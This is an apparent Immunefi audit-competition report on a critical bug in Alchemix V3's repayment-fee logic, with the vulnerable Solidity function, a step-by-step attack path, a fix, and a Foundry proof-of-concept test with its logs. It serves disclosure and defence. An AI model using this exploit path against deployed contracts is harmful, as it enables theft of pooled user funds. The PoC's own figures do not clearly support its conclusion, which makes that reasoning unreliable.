# 56385 sc critical repayment fee can be paid from the pool even when the account has no collateral left

**Submitted on Oct 15th 2025 at 11:04:18 UTC by @spongebob for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56385
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

`_resolveRepaymentFee` computes `fee = repaidAmountInYield * repaymentFee / BPS` and always returns the full value even when the account cannot cover it. The balance deduction is clamped (`account.collateralBalance -= min(fee, balance)`), but the unclamped fee is still returned.

<https://github.com/alchemix-finance/v3-poc/blob/b2e2aba046c36ff5e1db6f40f399e93cd2bdaad0/src/AlchemistV3.sol#L900-L907>

```solidity
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
        Account storage account = _accounts[accountId];
        // calculate repayment fee and deduct from account
        fee = repaidAmountInYield * repaymentFee / BPS;
        account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
        return fee;
    }
```

Both repayment-only paths in `_liquidate` transfer the returned fee to `msg.sender` without checking collateral availability, so any shortfall is paid out of the contract’s remaining pool, i.e. other users’ collateral.

<https://github.com/alchemix-finance/v3-poc/blob/b2e2aba046c36ff5e1db6f40f399e93cd2bdaad0/src/AlchemistV3.sol#L809-L828>

`_doLiquidation` already guards its base fee transfer with a collateral check highlighting the missing guard for repayment fees.

<https://github.com/alchemix-finance/v3-poc/blob/b2e2aba046c36ff5e1db6f40f399e93cd2bdaad0/src/AlchemistV3.sol#L862-L865>

**Attack Path**

1. Find an under‑collateralized account with earmarked debt so `_forceRepay` will pull collateral.
2. Call `liquidate(accountId)` as a liquidator. `_forceRepay` burns the account’s collateral to repay debt until its `collateralBalance` drops to (near) 0.
3. `_resolveRepaymentFee` computes `fee = repaid * repaymentFee / BPS`, subtracts only the remaining collateral (0), yet returns the full fee.
4. `_liquidate` transfers that returned amount to the liquidator without checking the account’s balance, paying the shortfall from the shared collateral pool.
5. Repeat across targets (or the same account if debt reaccumulates) to siphon pooled assets.

## Impact

A liquidator can extract more than the victim’s remaining collateral. The excess comes straight from the pooled collateral that backs all users. This falls under direct theft of user funds which is why i marked it critical

## Recommendation

Return only what was actually deducted. In `_resolveRepaymentFee`, clamp the fee against `account.collateralBalance`, subtract that amount, and return the clamped value. Then reuse the returned amount for the liquidator transfer. Optionally emit an event when the owed fee exceeds available collateral so operators can monitor partial recovery.

## Proof of Concept

Place test in `AlchemixV3.t.sol` and run `forge test --mt testPOC_Repayment_Fee_Theft_From_Shared_Pool -vvvv`

```solidity
function testPOC_Repayment_Fee_Theft_From_Shared_Pool() external {
        // ============================================
        // SETUP: Create whale supply for price manipulation
        // ============================================
        vm.startPrank(someWhale);
        IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
        vm.stopPrank();

        // ============================================
        // SETUP: Create a healthy account to keep global collateralization healthy
        // This ensures the system doesn't enter globally undercollateralized state
        // ============================================
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 2);
        alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // ============================================
        // STEP 1: Create victim position with maximum debt
        // ============================================
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
        alchemist.deposit(depositAmount, address(0xbeef), 0);

        uint256 tokenIdVictim = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));

        // Mint maximum debt at minimum collateralization ratio
        uint256 maxDebt = alchemist.totalValue(tokenIdVictim) * FIXED_POINT_SCALAR / minimumCollateralization;
        alchemist.mint(tokenIdVictim, maxDebt, address(0xbeef));
        vm.stopPrank();

        (uint256 victimInitialCollateral, uint256 victimInitialDebt,) = alchemist.getCDP(tokenIdVictim);
        console.log("Victim initial collateral:", victimInitialCollateral);
        console.log("Victim initial debt:", victimInitialDebt);

        // ============================================
        // STEP 2: Create transmuter redemption to earmark debt
        // This is crucial - earmarked debt triggers _forceRepay during liquidation
        // ============================================
        vm.startPrank(address(0xdad));
        deal(address(alToken), address(0xdad), victimInitialDebt);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), victimInitialDebt);
        transmuterLogic.createRedemption(victimInitialDebt);
        vm.stopPrank();

        // ============================================
        // STEP 3: Time-warp to earmark ALL of the debt
        // We'll earmark 100% of the debt so that after force repay, debt becomes 0
        // This triggers the repayment-only path at line 809-812 in AlchemistV3.sol
        // ============================================
        uint256 transmuterPeriod = transmuterLogic.timeToTransmute();
        vm.roll(block.number + transmuterPeriod);

        (uint256 victimCollateralBeforePrice, uint256 victimDebtBeforePrice, uint256 earmarked) = alchemist.getCDP(tokenIdVictim);
        console.log("Earmarked debt:", earmarked);
        console.log("Earmarked percentage:", (earmarked * 100) / victimDebtBeforePrice);

        // ============================================
        // STEP 4: Manipulate yield token price to make position undercollateralized
        // We use a LARGE price drop so that after force repay burns collateral,
        // very little remains - insufficient to cover the repayment fee
        // ============================================
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        // Increase yield token supply by 99% (massive price drop)
        uint256 modifiedVaultSupply = (initialVaultSupply * 9900 / 10_000) + initialVaultSupply;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        (uint256 victimCollateralAfterPrice, uint256 victimDebtAfterPrice,) = alchemist.getCDP(tokenIdVictim);
        uint256 collateralizationRatio = alchemist.totalValue(tokenIdVictim) * FIXED_POINT_SCALAR / victimDebtAfterPrice;
        console.log("Collateralization ratio after price drop:", collateralizationRatio);
        console.log("Minimum collateralization:", minimumCollateralization);

        // Verify position is undercollateralized
        require(collateralizationRatio < minimumCollateralization, "Position should be undercollateralized");

        // ============================================
        // STEP 5: Record state before liquidation
        // ============================================
        uint256 liquidatorPrevTokenBalance = IERC20(address(vault)).balanceOf(externalUser);
        uint256 alchemistContractBalanceBefore = IERC20(address(vault)).balanceOf(address(alchemist));

        console.log("\n=== STATE BEFORE LIQUIDATION ===");
        console.log("Victim collateral:", victimCollateralAfterPrice);
        console.log("Victim debt:", victimDebtAfterPrice);
        console.log("Earmarked debt:", earmarked);
        console.log("Liquidator balance before:", liquidatorPrevTokenBalance);
        console.log("Alchemist contract balance before:", alchemistContractBalanceBefore);

        // ============================================
        // STEP 6: Execute liquidation
        // This is where the vulnerability is exploited
        // ============================================
        vm.startPrank(externalUser);
        (uint256 assets, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenIdVictim);
        vm.stopPrank();

        // ============================================
        // STEP 7: Analyze the theft
        // ============================================
        (uint256 victimCollateralAfter, uint256 victimDebtAfter, uint256 earmarkedAfter) = alchemist.getCDP(tokenIdVictim);
        uint256 liquidatorPostTokenBalance = IERC20(address(vault)).balanceOf(externalUser);
        uint256 alchemistContractBalanceAfter = IERC20(address(vault)).balanceOf(address(alchemist));

        console.log("\n=== STATE AFTER LIQUIDATION ===");
        console.log("Victim collateral after:", victimCollateralAfter);
        console.log("Victim debt after:", victimDebtAfter);
        console.log("Earmarked after:", earmarkedAfter);
        console.log("Liquidator balance after:", liquidatorPostTokenBalance);
        console.log("Alchemist contract balance after:", alchemistContractBalanceAfter);

        // Calculate how much the liquidator received
        uint256 liquidatorGain = liquidatorPostTokenBalance - liquidatorPrevTokenBalance;
        console.log("Repayment fee received by liquidator:", feeInYield);
        console.log("Total liquidator gain:", liquidatorGain);

        // Calculate how much collateral the victim lost
        uint256 victimCollateralLoss = victimCollateralAfterPrice - victimCollateralAfter;
        console.log("Victim collateral loss:", victimCollateralLoss);

        // Calculate the theft amount
        // The liquidator received feeInYield, but the victim only had victimCollateralLoss available
        // The difference comes from the shared pool
        uint256 expectedRepaymentFee = alchemist.convertDebtTokensToYield(earmarked) * 100 / BPS; // 100 BPS = 1%
        console.log("Expected repayment fee (full calculation):", expectedRepaymentFee);

        // The contract balance decreased by more than the victim's collateral loss
        uint256 contractBalanceDecrease = alchemistContractBalanceBefore - alchemistContractBalanceAfter;
        console.log("Contract balance decrease:", contractBalanceDecrease);

        // ============================================
        // ASSERTIONS: Prove the vulnerability
        // ============================================

        // 1. The victim's collateral was completely depleted
        vm.assertEq(victimCollateralAfter, 0);

        // 2. The expected repayment fee (calculated on full repaid amount) is much larger
        // than what the liquidator actually received
        console.log("Expected fee (1% of repaid amount):", expectedRepaymentFee);
        console.log("Actual fee received by liquidator:", feeInYield);
        console.log("Difference:", expectedRepaymentFee - feeInYield);

        // 3. The liquidator still received a fee even though the victim had 0 collateral left
        // This fee came from the shared pool, not the victim's account
        vm.assertGt(feeInYield, 0);
        vm.assertEq(victimCollateralAfter, 0);

        console.log("The victim's collateral is now:", victimCollateralAfter);
        console.log("Yet the liquidator received a fee of:", feeInYield);
        console.log("This fee was extracted from the shared collateral pool!");
        console.log("The shortfall of", expectedRepaymentFee - feeInYield, "was absorbed by clamping");
        console.log("But", feeInYield, "was still paid out from the pool, not the victim's account");
    }
```

Logs

```bash
Logs:
  Victim initial collateral: 200000000000000000000000
  Victim initial debt: 180000000000000000018000
  Earmarked debt: 180000000000000000018000
  Earmarked percentage: 100
  Collateralization ratio after price drop: 558347292015633723
  Minimum collateralization: 1111111111111111111
  
=== STATE BEFORE LIQUIDATION ===
  Victim collateral: 200000000000000000000000
  Victim debt: 180000000000000000018000
  Earmarked debt: 180000000000000000018000
  Liquidator balance before: 200000000000000000000000
  Alchemist contract balance before: 400000000000000000000000
  
=== STATE AFTER LIQUIDATION ===
  Victim collateral after: 0
  Victim debt after: 0
  Earmarked after: 0
  Liquidator balance after: 202000000000000000000000
  Alchemist contract balance after: 198000000000000000000000
  Repayment fee received by liquidator: 2000000000000000000000
  Total liquidator gain: 2000000000000000000000
  Victim collateral loss: 200000000000000000000000
  Expected repayment fee (full calculation): 3582000000000000005767
  Contract balance decrease: 202000000000000000000000
  Expected fee (1% of repaid amount): 3582000000000000005767
  Actual fee received by liquidator: 2000000000000000000000
  Difference: 1582000000000000005767
  The victim's collateral is now: 0
  Yet the liquidator received a fee of: 2000000000000000000000
  This fee was extracted from the shared collateral pool!
  The shortfall of 1582000000000000005767 was absorbed by clamping
  But 2000000000000000000000 was still paid out from the pool, not the victim's account
```
